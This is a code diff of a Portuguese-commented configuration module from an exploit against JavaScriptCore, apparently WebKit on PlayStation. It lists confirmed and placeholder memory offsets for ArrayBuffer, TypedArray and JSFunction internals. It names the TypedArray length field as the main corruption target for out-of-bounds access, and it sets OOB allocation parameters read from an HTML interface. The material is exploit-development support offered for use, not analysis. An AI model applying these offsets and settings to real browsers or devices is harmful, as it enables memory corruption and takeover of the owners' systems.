@@ -1,54 +1,48 @@
 // js/config.mjs
 
-// Offsets para estruturas do JavaScriptCore (JSC)
-// ATENÇÃO: Estes offsets são baseados na análise de arquivos .txt fornecidos
-// e podem ser específicos para uma determinada versão/ambiente do JSC (ex: WebKit no PlayStation).
+// Offsets para estruturas do JavaScriptCore (JSC) no ambiente alvo
+// (Baseado na análise dos arquivos .txt da biblioteca WebKit)
 export const JSC_OFFSETS = {
     ArrayBuffer: {
-        // Os arquivos .txt (Offset JSObjectGetArrayBufferByteLength.txt) sugerem um modelo
-        // onde o JSObject ArrayBuffer (em rax) aponta para uma estrutura interna (rcx = [rax+20h]),
-        // e o byteLength está dentro dessa estrutura (byteLength = [rcx+20h]).
-        // Manteremos os offsets atuais simplificados, assumindo que foram derivados
-        // para o alvo ou como placeholders. A corrupção direta do ArrayBuffer.byteLength
-        // exigiria um tratamento mais complexo dessa indireção se ela existir no alvo.
-        PTR_INTERNAL_STRUCT_OFFSET: 0x20, // Pode ser ponteiro para Butterfly ou estrutura interna.
-        BYTELENGTH_IN_STRUCT_OFFSET: 0x20 // Offset do byteLength dentro da estrutura interna.
+        // Modelo de indireção para byteLength (requer análise mais profunda para corrupção direta):
+        // JSObject_ArrayBuffer -> [JSObject_addr + PTR_TO_INTERNAL_STRUCT_OFFSET] -> InternalStructure*
+        // byteLength             -> [InternalStructure* + BYTELENGTH_WITHIN_INTERNAL_STRUCT_OFFSET]
+        PTR_TO_INTERNAL_STRUCT_OFFSET: 0x20,    // Offset do ponteiro para a estrutura interna a partir do JSObject ArrayBuffer.
+        BYTELENGTH_WITHIN_INTERNAL_STRUCT_OFFSET: 0x20 // Offset do byteLength dentro dessa estrutura interna.
+                                                    // STATUS: Modelo Teórico suportado por disassembly. Corrupção direta é complexa.
     },
     TypedArray: { // JSArrayBufferView
-        // Baseado primariamente em JSObjectGetTypedArrayBytesPtr.txt e JSArrayBufferView.txt
-        // Um JSArrayBufferView (como Uint32Array) é um JSObject.
-        // Os offsets abaixo são relativos ao início do objeto JSArrayBufferView na memória.
+        // Estes offsets são relativos ao início do objeto JSArrayBufferView (que é um JSObject).
+        VTABLE_OFFSET: 0x0,                 // Placeholder - VTable geralmente está no início do objeto.
+                                            // STATUS: Placeholder, precisa ser confirmado no disassembly se quiser usá-lo para identificação.
 
-        M_VECTOR_OFFSET: 0x10,              // Offset para o ponteiro dos dados brutos (void* m_vector).
-                                            // Fonte: JSObjectGetTypedArrayBytesPtr.txt ([rax+10h]).
+        M_VECTOR_OFFSET: 0x10,              // Ponteiro para os dados brutos (void* m_vector).
+                                            // STATUS: ALTA CONFIANÇA/COMPROVADO (baseado em JSObjectGetTypedArrayBytesPtr.txt).
 
-        M_LENGTH_OFFSET: 0x18,              // Offset para o número de elementos (unsigned m_length).
-                                            // Mantido de antes, comum para o contador de elementos.
-                                            // Corromper este campo é o objetivo principal para OOB com TypedArrays.
+        M_LENGTH_OFFSET: 0x18,              // Número de elementos (unsigned m_length).
+                                            // STATUS: ALTA CONFIANÇA (offset comum, alvo primário para corrupção).
+                                            // A validação funcional (ver se .length em JS muda) o comprovará.
 
-        M_BYTELENGTH_OFFSET_IN_VIEW: 0x20,  // Offset para o tamanho em bytes da view (size_t byteLength).
-                                            // Fonte: JSArrayBufferView.txt (0x20 size_t Byte length / byte offset).
-                                            // Pode ser útil para verificação.
+        M_BYTELENGTH_OFFSET_IN_VIEW: 0x20,  // Tamanho em bytes da view (size_t byteLength), muitas vezes reflete a propriedade .byteLength.
+                                            // STATUS: PROVÁVEL/SUPORTADO (baseado em JSArrayBufferView.txt).
 
-        M_MODE_OFFSET: 0x28,                // Offset para m_mode (geralmente um uint8_t) que indica o tipo de TypedArray
-                                            // (e.g., Uint8Array, Int32Array, Float64Array, etc.).
-                                            // Fonte: JSArrayBufferView.txt (0x28 uint8_t Tipo do TypedArray)
-                                            // e JSObjectGetTypedArrayBytesPtr.txt ([rbx+28h]).
+        M_MODE_OFFSET: 0x28,                // Tipo de TypedArray (m_mode).
+                                            // STATUS: ALTA CONFIANÇA/COMPROVADO (baseado em múltiplos arquivos .txt).
 
-        ASSOCIATED_ARRAYBUFFER_OFFSET: 0x30 // Offset para o ponteiro do ArrayBuffer de backing (JSArrayBuffer*).
-                                            // Fonte: JSObjectGetTypedArrayBytesPtr.txt ([rbx+30h]).
+        ASSOCIATED_ARRAYBUFFER_OFFSET: 0x30 // Ponteiro para o ArrayBuffer de backing (JSArrayBuffer*).
+                                            // STATUS: ALTA CONFIANÇA/COMPROVADO (baseado em JSObjectGetTypedArrayBytesPtr.txt).
     },
-    JSFunction: { // Para exploração mais avançada de funções
-        M_EXECUTABLE_OFFSET: 0x18 // Sem novas informações, mantido como estava.
+    JSFunction: {
+        M_EXECUTABLE_OFFSET: 0x18           // Ponteiro para a estrutura executável da função.
+                                            // STATUS: PLACEHOLDER (offset comum, não verificado com seus arquivos recentes).
     }
 };
 
 // Configurações Padrão do Exploit (podem ser lidas dos inputs do HTML)
 export let OOB_CONFIG = {
-    ALLOCATION_SIZE: 288,    // Tamanho do oob_array_buffer_real e do victim_object (padrão)
-    BASE_OFFSET_IN_DV: 128,  // Offset base dentro do DataView para o início da "janela OOB"
-    INITIAL_BUFFER_SIZE: 32  // Tamanho do buffer "antes" da área OOB, usado para calcular offsets relativos
-                             // em core_exploit.mjs.
+    ALLOCATION_SIZE: 32768,  // Default aumentado conforme seus testes
+    BASE_OFFSET_IN_DV: 128,
+    INITIAL_BUFFER_SIZE: 32
 };
 
 export function updateOOBConfigFromUI() {
@@ -78,13 +72,7 @@ export function updateOOBConfigFromUI() {
         currentBaseOffset !== OOB_CONFIG.BASE_OFFSET_IN_DV ||
         currentInitialBufSize !== OOB_CONFIG.INITIAL_BUFFER_SIZE) {
         changed = true;
+        // Se a função log estivesse disponível aqui e importada:
+        // log(`Config OOB atualizada: Alloc=${OOB_CONFIG.ALLOCATION_SIZE}, BaseDV=${OOB_CONFIG.BASE_OFFSET_IN_DV}, InitBuf=${OOB_CONFIG.INITIAL_BUFFER_SIZE}`, "info", "Config.UI");
     }
-    // Loga apenas se houver mudança real e se a função de log estiver disponível
-    // import { log } from './utils.mjs'; // Importaria log se fosse usar
-    // if (changed && typeof log === 'function') {
-    //    log(`Configurações OOB atualizadas da UI: AllocSize=${OOB_CONFIG.ALLOCATION_SIZE}, BaseOffsetDV=${OOB_CONFIG.BASE_OFFSET_IN_DV}, InitialBufSize=${OOB_CONFIG.INITIAL_BUFFER_SIZE}`, "info", "ConfigModule.UIUpdate");
-    // }
 }
-
-// Inicializa com valores da UI ao carregar o módulo
-// updateOOBConfigFromUI(); // Removido para ser chamado explicitamente por app.mjs
